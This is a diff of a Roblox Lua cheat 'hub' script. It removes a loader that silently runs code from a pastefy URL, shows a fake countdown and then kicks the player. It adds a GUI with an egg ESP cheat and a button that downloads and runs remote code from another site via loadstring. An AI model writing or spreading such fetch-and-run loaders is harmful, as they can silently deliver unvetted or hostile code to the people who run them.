@@ -1,65 +1,304 @@
-local success, errorMsg = pcall(function()
-    loadstring(game:HttpGet("https://pastefy.app/q0Hv6Z1b/raw", true))()
-end)
+-- Pixiemo Hub (minimal, stable build) – GUI + Minimize + LIVE Egg ESP
+-- Drop this as a LocalScript in StarterPlayerScripts.
 
-local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield', true))()
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+local RunService = game:GetService("RunService")
+local UserInputService = game:GetService("UserInputService")
+local Workspace = game:GetService("Workspace")
 
-local Window = Rayfield:CreateWindow({
-    Name = "🌽 Grow A Garden",
-    LoadingTitle = "WyshScriptHub",
-    LoadingSubtitle = "By Wysh",
-    ConfigurationSaving = {
-        Enabled = false
-    },
-    Discord = {
-        Enabled = false
-    },
-    KeySystem = false
-})
+local LP = Players.LocalPlayer
+local PG = LP:WaitForChild("PlayerGui")
 
-local Tab = Window:CreateTab("⏳ Loading...", nil)
-local TimerSection = Tab:CreateSection("Please wait")
-local TimerLabel = Tab:CreateLabel("Hub will unlock in 1:30")
+-- destroy old copies
+local old = PG:FindFirstChild("PixiemoGUI")
+if old then old:Destroy() end
 
-local timeLeft = 90
-local timerRunning = true
-
-local function kickPlayer()
-    local player = game:GetService("Players").LocalPlayer
-    player:Kick("Your executor is not supported!")
+local function tweenHover(ui, baseSize)
+	if not ui or not ui:IsA("GuiObject") then return end
+	ui.MouseEnter:Connect(function()
+		TweenService:Create(ui, TweenInfo.new(0.12, Enum.EasingStyle.Sine, Enum.EasingDirection.Out), {
+			Size = baseSize + UDim2.fromOffset(6,4)
+		}):Play()
+	end)
+	ui.MouseLeave:Connect(function()
+		TweenService:Create(ui, TweenInfo.new(0.12, Enum.EasingStyle.Sine, Enum.EasingDirection.Out), {
+			Size = baseSize
+		}):Play()
+	end)
 end
 
-coroutine.wrap(function()
-    local startTime = tick()
-    
-    while timerRunning do
-        local elapsed = tick() - startTime
-        timeLeft = math.max(0, 90 - elapsed)
-        
-        if timeLeft <= 0 then
-            break
-        end
-        
-        local minutes = math.floor(timeLeft / 60)
-        local seconds = math.floor(timeLeft % 60)
-        TimerLabel:Set("Hub will unlock in: " .. string.format("%d:%02d", minutes, seconds))
-        
-        task.wait(0.1)
-    end
-    
-    TimerLabel:Set("Successfully!")
-    task.wait(1.5)
-    kickPlayer()
-end)()
+-- Root
+local gui = Instance.new("ScreenGui")
+gui.Name = "PixiemoGUI"
+gui.IgnoreGuiInset = true
+gui.ResetOnSpawn = false
+gui.Parent = PG
 
-coroutine.wrap(function()
-    task.wait(2)
-    while true do
-        pcall(function()
-            Window:Minimize()
-            task.wait(0.1)
-            Window:Maximize()
-        end)
-        task.wait(5)
-    end
-end)()
+-- Minimized pill
+local pill = Instance.new("TextButton")
+pill.Name = "Wysh"
+pill.Text = "WyshHub"
+pill.Size = UDim2.fromOffset(160, 32)
+pill.Position = UDim2.new(1, -170, 0, 12)
+pill.BackgroundColor3 = Color3.fromRGB(134,185,112)
+pill.TextColor3 = Color3.new(1,1,1)
+pill.TextSize = 18
+pill.Visible = false
+pill.Parent = gui
+do
+	local uc = Instance.new("UICorner"); uc.CornerRadius = UDim.new(1,0); uc.Parent = pill
+	local st = Instance.new("UIStroke"); st.Color = Color3.fromRGB(80,110,70); st.Thickness=2; st.Parent = pill
+end
+
+-- Window
+local win = Instance.new("Frame")
+win.Size = UDim2.fromOffset(420, 330)
+win.Position = UDim2.new(0.5, 0, 0.5, 0)
+win.AnchorPoint = Vector2.new(0.5, 0.5)
+win.BackgroundColor3 = Color3.fromRGB(195,235,185)
+win.Parent = gui
+do
+	local uc = Instance.new("UICorner"); uc.CornerRadius = UDim.new(0,24); uc.Parent = win
+	local st = Instance.new("UIStroke"); st.Color = Color3.fromRGB(150,190,130); st.Thickness=3; st.Parent = win
+end
+
+-- Header (draggable)
+local header = Instance.new("Frame")
+header.Size = UDim2.new(1,0,0,36)
+header.BackgroundColor3 = Color3.fromRGB(134,185,112)
+header.Active = true
+header.Parent = win
+do
+	local uc = Instance.new("UICorner"); uc.CornerRadius = UDim.new(0,24); uc.Parent = header
+end
+
+local title = Instance.new("TextLabel")
+title.BackgroundTransparency = 1
+title.Size = UDim2.fromScale(1,1)
+title.Text = "  Pixiemo Hub"
+title.TextColor3 = Color3.new(1,1,1)
+title.TextSize = 22
+title.Font = Enum.Font.GothamBold
+title.TextXAlignment = Enum.TextXAlignment.Left
+title.Parent = header
+
+local minimize = Instance.new("TextButton")
+minimize.Size = UDim2.fromOffset(22,22)
+minimize.Position = UDim2.new(1, -14 - 22, 0.5, -11)
+minimize.BackgroundColor3 = Color3.fromRGB(255,212,59)
+minimize.Text = ""
+minimize.Parent = header
+do
+	local uc = Instance.new("UICorner"); uc.CornerRadius = UDim.new(1,0); uc.Parent = minimize
+end
+
+-- Dragging
+do
+	local dragging = false
+	local dragStart, startPos
+	header.InputBegan:Connect(function(input)
+		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+			dragging = true
+			dragStart = input.Position
+			startPos = win.Position
+		end
+	end)
+	header.InputEnded:Connect(function(input)
+		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+			dragging = false
+		end
+	end)
+	UserInputService.InputChanged:Connect(function(input)
+		if not dragging then return end
+		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+			local delta = input.Position - dragStart
+			win.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+		end
+	end)
+end
+
+-- Minimize behavior
+minimize.MouseButton1Click:Connect(function()
+	local screenSize = gui.AbsoluteSize
+	local targetPos = UDim2.new(1, -170, 0, 12)
+	TweenService:Create(win, TweenInfo.new(0.22), {
+		Size = UDim2.fromOffset(0,0),
+		Position = UDim2.new(targetPos.X.Scale, targetPos.X.Offset + 80, targetPos.Y.Scale, targetPos.Y.Offset + 16)
+	}):Play()
+	task.delay(0.22, function()
+		win.Visible = false
+		pill.Visible = true
+	end)
+end)
+
+pill.MouseButton1Click:Connect(function()
+	pill.Visible = false
+	win.Size = UDim2.fromOffset(420,330)
+	win.Position = UDim2.new(0.5,0,0.5,0)
+	win.Visible = true
+end)
+
+-- Body
+local body = Instance.new("Frame")
+body.Size = UDim2.new(1, -24, 1, -36 - 24)
+body.Position = UDim2.new(0, 12, 0, 36 + 6)
+body.BackgroundTransparency = 1
+body.Parent = win
+
+-- Status line
+local status = Instance.new("TextLabel")
+status.BackgroundTransparency = 1
+status.Size = UDim2.new(1,0,0,20)
+status.Position = UDim2.new(0,0,1,-20)
+status.Text = "Ready."
+status.TextColor3 = Color3.fromRGB(80,110,70)
+status.TextSize = 14
+status.Font = Enum.Font.Gotham
+status.Parent = win
+
+local function setStatus(txt)
+	status.Text = txt
+	print("[Pixiemo]", txt)
+end
+
+-- Helpers
+local function makeButton(txt, posY)
+	local btn = Instance.new("TextButton")
+	btn.Size = UDim2.new(0, 360, 0, 40)
+	btn.Position = UDim2.new(0.5, -180, 0, posY)
+	btn.BackgroundColor3 = Color3.fromRGB(134,185,112)
+	btn.Text = txt
+	btn.TextColor3 = Color3.new(1,1,1)
+	btn.TextSize = 20
+	btn.Font = Enum.Font.GothamBold
+	btn.Parent = body
+	local uc = Instance.new("UICorner"); uc.CornerRadius = UDim.new(0,10); uc.Parent = btn
+	local st = Instance.new("UIStroke"); st.Color = Color3.fromRGB(80,110,70); st.Thickness=2; st.Parent = btn
+	tweenHover(btn, btn.Size)
+	return btn
+end
+
+local function makeToggleRow(label, posY)
+	local row = Instance.new("Frame")
+	row.Size = UDim2.new(0, 360, 0, 40)
+	row.Position = UDim2.new(0.5, -180, 0, posY)
+	row.BackgroundTransparency = 1
+	row.Parent = body
+
+	local tl = Instance.new("TextLabel")
+	tl.Size = UDim2.new(0.7, 0, 1, 0)
+	tl.BackgroundTransparency = 1
+	tl.Font = Enum.Font.GothamBold
+	tl.Text = label
+	tl.TextSize = 20
+	tl.TextColor3 = Color3.fromRGB(80,110,70)
+	tl.TextXAlignment = Enum.TextXAlignment.Left
+	tl.Parent = row
+
+	local btn = Instance.new("TextButton")
+	btn.Size = UDim2.new(0.25, 0, 0.7, 0)
+	btn.Position = UDim2.new(0.75, 0, 0.15, 0)
+	btn.Text = "OFF"
+	btn.Font = Enum.Font.GothamBold
+	btn.TextSize = 18
+	btn.TextColor3 = Color3.new(1,1,1)
+	btn.BackgroundColor3 = Color3.fromRGB(120,120,120)
+	btn.Parent = row
+
+	local uc = Instance.new("UICorner"); uc.CornerRadius = UDim.new(0,10); uc.Parent = btn
+	tweenHover(btn, btn.Size)
+
+	local on = false
+	local function setState(v)
+		on = v
+		btn.Text = on and "ON" or "OFF"
+		btn.BackgroundColor3 = on and Color3.fromRGB(80,200,120) or Color3.fromRGB(120,120,120)
+	end
+	return row, btn, function() return on end, setState
+end
+
+---------------------------------------------------------------------
+-- EGG ESP (works on any Model with "egg" in its name; updates live)
+---------------------------------------------------------------------
+local eggRow, eggBtn, eggGet, eggSet = makeToggleRow("🍚 EGG ESP", 10)
+local activeEggs = {}    -- [Model] = Highlight
+
+local function isEggModel(inst)
+	return inst:IsA("Model") and inst.Name:lower():find("egg") ~= nil
+end
+
+local function addHighlight(m)
+	if activeEggs[m] then return end
+	local h = Instance.new("Highlight")
+	h.FillTransparency = 0.7
+	h.OutlineTransparency = 0
+	h.Parent = m
+	activeEggs[m] = h
+end
+
+local function removeHighlight(m)
+	local h = activeEggs[m]
+	if h then h:Destroy() end
+	activeEggs[m] = nil
+end
+
+local function rescanEggs()
+	for m,h in pairs(activeEggs) do
+		if not m or not m.Parent then
+			if h then h:Destroy() end
+			activeEggs[m] = nil
+		end
+	end
+	for _,d in ipairs(Workspace:GetDescendants()) do
+		if isEggModel(d) and eggGet() then
+			addHighlight(d)
+		end
+	end
+end
+
+-- live updates when new things appear
+local descAddedConn
+local function enableEggESP()
+	eggSet(true); setStatus("EGG ESP ACTIVE")
+	rescanEggs()
+	descAddedConn = Workspace.DescendantAdded:Connect(function(d)
+		if eggGet() and isEggModel(d) then addHighlight(d) end
+	end)
+end
+
+local function disableEggESP()
+	eggSet(false); setStatus("EGG ESP INACTIVE")
+	if descAddedConn then descAddedConn:Disconnect() descAddedConn = nil end
+	for m,h in pairs(activeEggs) do
+		if h then h:Destroy() end
+	end
+	table.clear(activeEggs)
+end
+
+eggBtn.MouseButton1Click:Connect(function()
+	if eggGet() then disableEggESP() else enableEggESP() end
+end)
+
+---------------------------------------------------------------------
+-- Example "Not available yet" buttons (safe placeholders)
+---------------------------------------------------------------------
+local btnRandomize = makeButton("🎲 Auto Randomize (placeholder)", 60)
+btnRandomize.MouseButton1Click:Connect(function()
+	setStatus("Auto Randomize requires game-specific remotes. Share paths to wire this.")
+end)
+
+local btnRarest = makeButton("💎 Auto Stop at Rarest (placeholder)", 110)
+btnRarest.MouseButton1Click:Connect(function()
+	setStatus("Rarest detection needs your rarity logic. I can hook it if you provide it.")
+end)
+
+-- Add Reverse Loader button
+local btnReverse = makeButton("🔄 Load Reverse Hub", 160)
+btnReverse.MouseButton1Click:Connect(function()
+    setStatus("Loading Reverse Hub...")
+    loadstring(game:HttpGet("https://cdn.reverse.software/loader.luau"))()
+end)
+
+-- initial
+setStatus("Ready.")
